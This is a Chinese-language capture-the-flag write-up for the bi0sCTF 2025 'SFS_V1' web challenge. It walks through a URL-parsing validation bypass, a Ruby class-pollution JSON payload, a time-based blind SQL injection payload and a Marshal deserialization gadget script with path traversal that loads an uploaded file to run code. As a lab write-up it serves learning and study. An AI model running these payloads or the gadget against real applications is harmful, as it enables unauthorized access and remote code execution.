# bi0sCTF 2025 - SFS_V1 题解

## 题目简述

题目由对外的 Rails `core` 服务和只在容器内部开放的 Ruby `legacy` 文件服务组成。flag 位于 `legacy`，而 `core` 的转发入口同时要求账号已验证并携带正确的 `Legacy` Cookie。完整攻击链分为四段：单斜杠 URL 绕过账号验证、Ruby class pollution 精确修改控制器类变量、SQL 时间盲注泄露 Cookie、Ruby Marshal gadget 加载已上传文件并取得代码执行。

管理员源码 `legacy_storage.rb` 中的 flag 为：

```text
bi0sctf{Will_be_back_next_year_with_SFS_V2_:)}
```

## 解题过程

### 1. 绕过账号验证

注册接口只禁止 URL 文本中出现 `localhost`。验证接口则使用：

```ruby
parsed_url = URI.parse(@user.url)
if parsed_url.scheme != "http" && parsed_url.scheme != "https"
  # reject
elsif parsed_url.host && parsed_url.host != "localhost"
  # reject
elsif HealthcheckController.new.validate_path(@user.url, @user)
  @user.update!(validated: true)
end
```

Ruby 把 `http:/example.com/alice` 解析为 scheme `http`、host `nil`、path `/example.com/alice`。因此注册用户名 `alice` 时可提交这个 URL：host 为空使第二个条件不成立，路径又以用户名结尾，账号便被标记为已验证。

### 2. 用 Rotate Chains 污染类变量

`/settings` 会解析用户 JSON，并把它递归合并到当前 `Setting` 对象：

```ruby
user_settings = JSON.parse(settings_params[:json_data], max_nesting: 150)
added_settings = Utils::Add.adder(@settings, user_settings)
```

`Utils::Add.adder` 会对现有键调用无参数方法，对不存在的键执行 `instance_variable_set` 并创建 accessor。攻击者由此可以沿方法返回值穿过对象图。起始上行链为：

```text
Setting 实例 -> class -> Setting
             -> superclass -> ApplicationRecord
             -> superclass -> ActiveRecord::Base
             -> superclass -> Object
```

到达 `Object.subclasses` 后，普通的 `sample` 命中目标类概率太低。官方解法使用数组的 `rotate`：每轮都把目标数组左移，再用 `first` 进入当前候选类；把上一次 payload 再包一层 `rotate` 并重复提交，就能按已知加载顺序稳定走到目标。先依次访问注册、设置和验证控制器，使有关类进入可预测顺序，再走下面的下降链：

```text
Object
  -> AbstractController::Base
  -> ActionController::Metal
  -> ActionController::Base
  -> ApplicationController
  -> HealthcheckController
```

污染 `admin_url` 时，官方 exploit 使用的末端结构是：

```json
{
  "first": {
    "subclasses": {
      "first": {
        "subclasses": {
          "first": {
            "subclasses": {
              "first": {
                "subclasses": {
                  "first": {
                    "admin_url": "http://localhost:3000/qwe"
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

外层再依次包成 `{"rotate": ...}`、`{"subclasses": ...}` 以及 `class/superclass/superclass/superclass` 上行链，并在每轮提交后增加一层 `rotate`。

### 3. 构造时间盲注，恢复 Legacy Cookie

`HealthcheckController` 把可污染的类变量直接拼入 SQL：

```ruby
admin_exists = User.where(
  "username = '#{HealthcheckController.admin_username}'"
)
```

查询有结果时才会请求 `admin_url`。`ProfileController#show` 固定忙等 5 秒，而路由会把 `/qwe` 交给该控制器，所以将 `admin_url` 污染为 `http://localhost:3000/qwe` 后，SQL 条件真假就变成明显的时间差。对候选前缀 `L%`，污染 `admin_username` 为：

```sql
' OR (SELECT EXISTS (
  SELECT 1 FROM legacies WHERE legacy_secret LIKE 'L%'
)) --
```

然后请求 `/health`：约 5 秒表示前缀正确，立即返回表示错误。逐字符扩展前缀即可恢复远端真正的 `legacy_secret`。管理员源码与种子数据中的值是 `b7kjnbpb4t`；手册版使用不同值，因此实战不能把手册常量硬编码成远端答案。

### 4. 从 Marshal 反序列化走到文件加载

在泄露 Cookie 的同时，先通过 `/settings` 上传 `load_command.rb`。该文件会出现在内部共享目录 `/app/internal_uploads`，内容可以是读取 `/flag.txt` 并发送到自有接收端的 Ruby 代码。

`legacy_storage.rb` 随后执行：

```ruby
decoded = Base64.decode64(string_part[:data])
legacy_object = Marshal.load(decoded)
key = key_part[:data]
if legacy_object[key] == "no_store"
  FileUtils.rm(file_path)
end
```

危险点不只是 `Marshal.load` 本身。反序列化一个可控 `Gem::CommandManager` 后，紧接着的 `legacy_object[key]` 会调用它的 `[]` 方法；该方法再进入 `load_and_instantiate(command_name)`，最终执行：

```ruby
require "rubygems/commands/#{command_name}_command"
```

官方 `cook.rb` 用下面的对象生成 Base64 数据：

```ruby
require "base64"

class Gem::CommandManager
  def initialize; end
end

path = "../../../../../../../../../../app/internal_uploads/load"
obj = Gem::CommandManager.new
obj.instance_variable_set(:@commands, {path => false})
puts Base64.strict_encode64(Marshal.dump(obj))
```

向 `/legacy` 同时提交：

- 任意 `file`；
- 上述 Base64 结果作为 `string`；
- `../../../../../../../../../../app/internal_uploads/load` 作为 `key`；
- 刚恢复的值作为 `Legacy` Cookie。

拼接 `_command` 后，`require` 的路径穿越结果正好指向先前上传的 `load_command.rb`，Ruby 加载文件时执行其中代码，从而读取 flag。这里所谓的“one-gadget”是“反序列化后一次 `[]` 调用就触发加载”的 Ruby 方法 gadget，不是 glibc 的 `one_gadget`。

官方文章完整解释了 Rotate Chains 的类顺序控制和 Marshal gadget；本文已把这些决定性信息写入正文，链接保留供核对原始 exploit：[SFS_V1 - bi0sCTF 2025](https://blog.bi0s.in/2025/09/01/Web/SFS_V1-bi0sCTF20252025/)。

## 方法总结

这题不是单个漏洞，而是一条严格依赖前序状态的链：URL 解析差异取得 validated 状态，递归对象合并上溯到 `Object`，Rotate Chains 精确落到控制器，SQL 查询与 5 秒内部请求组成布尔信道，最后由 `Gem::CommandManager#[]` 把 Marshal 对象变成任意文件加载。本文依据当前源码、仓库官方 exploit 和出题人文章重建了整条链，但没有启动双 Rails 服务重跑远端，因此 5 秒阈值和实际远端 Cookie 泄露属于源码与官方运行结果，而非本机动态日志。
